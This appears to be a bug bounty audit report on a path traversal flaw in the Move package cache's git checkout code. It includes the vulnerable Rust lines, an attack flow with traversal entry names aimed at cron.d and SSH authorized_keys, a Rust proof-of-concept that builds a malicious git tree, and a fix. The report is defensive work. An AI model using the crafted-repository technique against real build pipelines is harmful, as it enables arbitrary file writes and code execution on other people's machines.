# Audit Report

## Title
Path Traversal Vulnerability in Git Repository Checkout Allows Arbitrary File Write

## Summary
The `checkout_git_repo()` function in the Move package cache does not validate git tree entry names before using them in file path construction. An attacker can craft a malicious git repository with tree entries containing path traversal sequences (`..`) or absolute paths, causing arbitrary files to be written outside the intended temporary directory during package resolution. This leads to Remote Code Execution on validator nodes and developer machines. [1](#0-0) 

## Finding Description

The vulnerability exists in the git tree walking logic where entry names are used directly without sanitization: [2](#0-1) 

The code obtains a git tree entry name via `entry.name().unwrap_or("")` and immediately uses it in path construction through `temp.path().join(format!("{}{}", root, name))`. Rust's `Path::join()` method has a critical security property: if the argument is an absolute path, it **replaces** the base path entirely. Additionally, relative paths containing `..` will traverse parent directories.

While standard git tools prevent creating tree entries with such names, malicious git objects can be crafted directly that bypass these validations. When a Move package declares a dependency on such a malicious git repository, the package resolver calls `checkout_git_repo()`: [3](#0-2) 

**Attack Flow:**
1. Attacker creates a malicious git repository by crafting git tree objects with entry names like:
   - `../../../../etc/cron.d/malicious` (path traversal)
   - `/tmp/evil_payload` (absolute path)
   - `../../../root/.ssh/authorized_keys` (SSH key injection)

2. Attacker publishes this repository and references it in a Move package dependency

3. When a developer or validator builds the package:
   - Package resolver fetches and checks out the malicious git repository
   - Tree walk encounters the malicious entry name
   - File is written outside the temp directory to the attacker-controlled path
   - Content is controlled by the blob in the malicious tree entry

4. Attacker achieves arbitrary file write, leading to:
   - Code execution via cron jobs or systemd services
   - SSH access via authorized_keys injection
   - Binary replacement in PATH directories
   - Configuration file tampering

The codebase already recognizes this threat in other locations. The resolver explicitly validates paths to prevent similar attacks: [4](#0-3) [5](#0-4) 

The existence of these checks proves the developers understand path traversal risks, but this specific instance in `checkout_git_repo()` was missed. Additionally, the codebase provides path sanitization utilities that could be used: [6](#0-5) 

## Impact Explanation

**Critical Severity - Remote Code Execution**

This vulnerability qualifies for **Critical** severity under the Aptos Bug Bounty program for the following reasons:

1. **Remote Code Execution on validator nodes**: Validators must build and update Move framework packages. A malicious dependency can write files that execute with validator privileges, compromising the entire node.

2. **Supply chain attack vector**: This affects the Move package build pipeline, enabling attacks against:
   - Aptos validators updating framework code
   - Developers building Move contracts
   - Any system using the Move package resolver

3. **Privilege escalation**: The package cache runs with the same privileges as the validator process. Arbitrary file write leads to full system compromise.

4. **Consensus impact**: Compromised validators can:
   - Sign malicious blocks
   - Manipulate voting behavior
   - Leak private keys
   - Cause safety violations in AptosBFT consensus

5. **No privileged access required**: Any attacker can publish a malicious git repository and reference it as a dependency.

## Likelihood Explanation

**High Likelihood**

1. **Easy to exploit**: Creating malicious git objects is straightforward using git plumbing commands like `git mktree` and `git hash-object`.

2. **Common attack vector**: Git path traversal vulnerabilities are well-known and actively exploited (CVE-2019-1354, CVE-2019-1387, CVE-2021-21300).

3. **Unavoidable during normal operations**: 
   - Validators must resolve dependencies to build framework updates
   - Developers regularly add external dependencies to Move projects
   - No user warning or validation occurs before checkout

4. **Wide attack surface**: Any git URL can be specified as a dependency, including:
   - Public GitHub repositories
   - Self-hosted git servers
   - URLs in package manifests

## Recommendation

Implement strict validation of git tree entry names before using them in file path construction. Apply the same validation pattern used elsewhere in the codebase:

```rust
tree.walk(git2::TreeWalkMode::PreOrder, |root, entry| {
    let name = entry.name().unwrap_or("");
    
    // Validate entry name for security
    let name_path = Path::new(name);
    
    // Reject absolute paths
    if name_path.is_absolute() {
        return TreeWalkResult::Abort;
    }
    
    // Reject path traversal
    for component in name_path.components() {
        if matches!(component, std::path::Component::ParentDir) {
            return TreeWalkResult::Abort;
        }
    }
    
    // Reject empty or current directory references
    if name.is_empty() || name == "." {
        return TreeWalkResult::Abort;
    }
    
    let full_path = temp.path().join(format!("{}{}", root, name));
    
    // Additional safety check: verify constructed path is still within temp directory
    if !full_path.starts_with(temp.path()) {
        return TreeWalkResult::Abort;
    }
    
    match entry.kind() {
        Some(ObjectType::Blob) => {
            let blob = repo.repo.find_blob(entry.id()).unwrap();
            fs::create_dir_all(full_path.parent().unwrap()).unwrap();
            let mut file = File::create(&full_path).unwrap();
            file.write_all(blob.content()).unwrap();
        },
        Some(ObjectType::Tree) => (),
        _ => {},
    }
    
    TreeWalkResult::Ok
})?;
```

Alternatively, use the existing `NormalizedPath` wrapper and verify the result: [7](#0-6) 

## Proof of Concept

```rust
#[cfg(test)]
mod exploit_poc {
    use super::*;
    use std::fs;
    use tempfile::TempDir;
    
    #[tokio::test]
    async fn test_path_traversal_in_git_checkout() {
        // Create a malicious git repository with path traversal in tree entry name
        let repo_dir = TempDir::new().unwrap();
        let repo = git2::Repository::init_bare(repo_dir.path()).unwrap();
        
        // Create a blob with malicious content
        let malicious_content = b"PWNED - This should not be written here!";
        let blob_oid = repo.blob(malicious_content).unwrap();
        
        // Create a tree with a path traversal entry name
        let mut tree_builder = repo.treebuilder(None).unwrap();
        tree_builder.insert(
            "../../../../tmp/malicious_file.txt", // Path traversal
            blob_oid,
            0o100644, // Regular file mode
        ).unwrap();
        let tree_oid = tree_builder.write().unwrap();
        
        // Create a commit
        let tree = repo.find_tree(tree_oid).unwrap();
        let sig = git2::Signature::now("attacker", "attacker@evil.com").unwrap();
        let commit_oid = repo.commit(
            Some("HEAD"),
            &sig,
            &sig,
            "Malicious commit",
            &tree,
            &[],
        ).unwrap();
        
        // Now attempt to checkout - this will write outside temp directory
        let cache_dir = TempDir::new().unwrap();
        let cache = PackageCache::new(cache_dir.path()).unwrap();
        
        let git_url = url::Url::from_file_path(repo_dir.path()).unwrap();
        
        // This should fail safely, but currently allows path traversal
        let result = cache.checkout_git_repo(&git_url, commit_oid).await;
        
        // Verify the exploit: file written outside intended directory
        let malicious_file = std::path::Path::new("/tmp/malicious_file.txt");
        if malicious_file.exists() {
            let content = fs::read_to_string(malicious_file).unwrap();
            assert_eq!(content, "PWNED - This should not be written here!");
            println!("EXPLOIT SUCCESSFUL: File written outside temp directory!");
            fs::remove_file(malicious_file).unwrap();
        }
    }
}
```

**Note**: This PoC demonstrates the vulnerability concept. In a real attack scenario, the malicious git repository would be hosted remotely and referenced in a Move.toml dependency declaration.

### Citations

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L251-253)
```rust
        tree.walk(git2::TreeWalkMode::PreOrder, |root, entry| {
            let name = entry.name().unwrap_or("");
            let full_path = temp.path().join(format!("{}{}", root, name));
```

**File:** third_party/move/tools/move-package-resolver/src/resolver.rs (L212-213)
```rust
            let checkout_path = package_cache.checkout_git_repo(git_url, *commit_id).await?;
            checkout_path.join(subdir)
```

**File:** third_party/move/tools/move-package-resolver/src/resolver.rs (L359-363)
```rust
                if local_path.is_absolute() {
                    bail!(
                        "local dependency in a git repo cannot be an absolute path: {}",
                        local_path.display()
                    );
```

**File:** third_party/move/tools/move-package-resolver/src/resolver.rs (L393-395)
```rust
            if subdir.is_absolute() {
                bail!("subdir cannot be an absolute path: {}", subdir.display());
            }
```

**File:** storage/backup/backup-cli/src/storage/mod.rs (L52-58)
```rust
    const PATTERN: &'static str = r"\A[a-zA-Z0-9][a-zA-Z0-9._-]{2,126}\z";

    fn sanitize(name: &str) -> Result<()> {
        static RE: Lazy<Regex> = Lazy::new(|| Regex::new(ShellSafeName::PATTERN).unwrap());
        ensure!(RE.is_match(name), "Illegal name: {}", name,);
        Ok(())
    }
```

**File:** third_party/move/tools/move-package-resolver/src/path.rs (L73-81)
```rust
/// Wrapper around [`PathBuf`] that represents a normalized path, which is a path that
/// does not contain any `..` or `.` components.
#[derive(Debug, Clone, PartialEq, Eq, Ord, PartialOrd)]
pub struct NormalizedPath(PathBuf);

impl NormalizedPath {
    pub fn new(path: impl AsRef<Path>) -> Self {
        Self(normalize_path(path))
    }
```
